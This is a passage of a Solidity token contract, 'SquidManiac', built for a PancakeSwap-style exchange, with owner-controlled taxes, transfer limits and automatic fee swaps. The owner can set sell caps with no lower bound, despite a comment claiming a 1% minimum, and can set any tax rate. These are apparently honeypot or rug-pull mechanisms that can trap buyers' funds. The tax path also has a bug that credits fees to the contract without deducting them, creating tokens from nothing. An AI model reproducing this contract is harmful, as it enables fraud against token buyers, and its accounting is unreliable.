        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract SquidManiac is
    Context,
    IERC20,
    Ownable //
{
    using SafeMath for uint256;
    using Address for address;
    using Address for address payable;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool inSwapAndLiquify;
    bool public SwapAndLiquifyEnabled = true;
    bool public _TAX = false;

    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) public isTxLimitExempt;
    mapping(address => bool) public isWalletLimitExempt;

    uint256 private _totalSupply;
    uint256 public _maxValueBuys;
    uint256 public _maxValueSell;
    uint256 private swapToken_At_Amount;

    string private _name; //
    string private _symbol; //
    uint8 private constant _decimals = 9; //

    uint256 public _marketingTax; //
    uint256 public _liquidityTax; //
    address payable public _marketingWallet = payable(_msgSender()); //

    uint256 public _buyCooldown = 0 minutes;
    mapping(address => uint256) private _lastBuy;

    bool private swapping;

    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiquidity
    );

    modifier lockTheSwap() {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    constructor(
        string[] memory aboutToken,
        uint256[] memory amount,
        uint256[] memory tax
    ) {
        string memory names = aboutToken[1];
        string memory symbols = aboutToken[2];
        uint256 _tSupply = amount[1] * 10**amount[2] * 10**_decimals;
        uint256 maxValueBuys = (_tSupply * amount[3]) / 100;
        uint256 maxValueSell = (_tSupply * amount[4]) / 100;
        uint256 swapToken = (_tSupply * amount[5]) / 1000;
        _tOwned[_msgSender()] = _tSupply;

        _name = names;
        _symbol = symbols;

        _totalSupply = _tSupply;
        _maxValueBuys = maxValueBuys;
        _maxValueSell = maxValueSell;
        swapToken_At_Amount = swapToken;

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            0x10ED43C718714eb63d5aA57B78B54704E256024E
        );
        // Create a uniswap pair for this new token
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = _uniswapV2Pair;

        //exclude owner and this contract from fee
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_marketingWallet] = true;

        isWalletLimitExempt[owner()] = true;
        isWalletLimitExempt[address(uniswapV2Pair)] = true;
        isWalletLimitExempt[address(this)] = true;
        isWalletLimitExempt[_marketingWallet] = true;

        isTxLimitExempt[owner()] = true;
        isTxLimitExempt[address(this)] = true;
        isTxLimitExempt[_marketingWallet] = true;

        uint256 liquidityTax = tax[1];
        _liquidityTax = liquidityTax;
        uint256 marketingTax = tax[2];
        _marketingTax = marketingTax;

        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()] - amount
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] - subtractedValue
        );
        return true;
    }

    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }

    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
    }

    function enableOrDisableTax(uint8 numberic) public onlyOwner {
        if (numberic == 1) {
            _TAX = false;
        }
        if (numberic == 2) {
            _TAX = true;
        }
    }

    function SlimeTax(uint256[] memory customs) external onlyOwner {
        require(_TAX, "tax change disabled");
        _marketingTax = customs[1]; 
        _liquidityTax = customs[2];
    }

    function Slimekwallet(uint256[] memory customs) external onlyOwner {
        _maxValueBuys = customs[1] *1e9 ; 
        _maxValueSell = customs[2] *1e9 ; // cannot set under 1%
    }

    //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function _getValues(uint256 amount, address from)
        private
        returns (uint256)
    {
        if (!_TAX) {
            uint256 marketingFee = (amount * _marketingTax) / 100;
            uint256 liquidityFee = (amount * _liquidityTax) / 100;
            _tOwned[address(this)] += marketingFee + liquidityFee;
            emit Transfer(from, address(this), marketingFee + liquidityFee);
            return (amount - marketingFee - liquidityFee);
        } else if (_TAX) {
            uint256 marketingFee = (amount * _marketingTax) / 100;
            uint256 liquidityFee = (amount * _liquidityTax) / 100;
            _tOwned[address(this)] += marketingFee + liquidityFee;
            emit Transfer(from, address(this), marketingFee + liquidityFee);
            return (amount - liquidityFee);
        }

        return (amount);
    }

    function isExcludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFee[account];
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (from != owner() && to != owner()) {
            if (from == uniswapV2Pair) {
                require(
                    amount <= _maxValueBuys,
                    "Transfer amount exceeds the maxTxAmount."
                );
            } else if (from != uniswapV2Pair && from != address(this)) {
                require(
                    amount <= _maxValueSell,
                    "Transfer amount exceeds the maxTxAmount."
                );
            }
        }

        if (from == uniswapV2Pair) {
            require(
                _lastBuy[to] + _buyCooldown < block.timestamp,
                "Must wait til after coooldown to buy"
            );
            _lastBuy[to] = block.timestamp;
        }

        if (
            balanceOf(address(this)) >= swapToken_At_Amount &&
            !swapping &&
            from != uniswapV2Pair
        ) {
            swapping = true;
            uint256 sellTokens = balanceOf(address(this));
            swapAndSendToFee(sellTokens);
            swapping = false;
        }

        _tOwned[from] -= amount;
        uint256 transferAmount = amount;

        //if any account belongs to _isExcludedFromFee account then remove the fee
        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
            transferAmount = _getValues(amount, from);
        }

        _tOwned[to] += transferAmount;
        emit Transfer(from, to, transferAmount);
    }

    function swapAndSendToFee(uint256 tokens) private {
        uint256 ethToSend = swapTokensForEth(tokens);

        if (ethToSend > 0) payable(_marketingWallet).transfer(ethToSend);
    }

    function swapAndLiquify() private {
        // split the contract balance into halves
        uint256 liquidityTokens = (balanceOf(address(this)) * _liquidityTax) /
            (_marketingTax + _liquidityTax);
        uint256 half = liquidityTokens / 2;
        uint256 otherHalf = liquidityTokens - half;
        uint256 newBalance = swapTokensForEth(half);

        if (newBalance > 0) {
            liquidityTokens = 0;
            addLiquidity(otherHalf, newBalance);
            emit SwapAndLiquify(half, newBalance, otherHalf);
        }
    }

    function swapTokensForEth(uint256 tokenAmount) private returns (uint256) {
        uint256 initialBalance = address(this).balance;
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
        return (address(this).balance - initialBalance);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        (, uint256 ethFromLiquidity, ) = uniswapV2Router.addLiquidityETH{
            value: ethAmount
        }(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp
        );

        if (ethAmount - ethFromLiquidity > 0)
            payable(_marketingWallet).sendValue(ethAmount - ethFromLiquidity);
    }
}
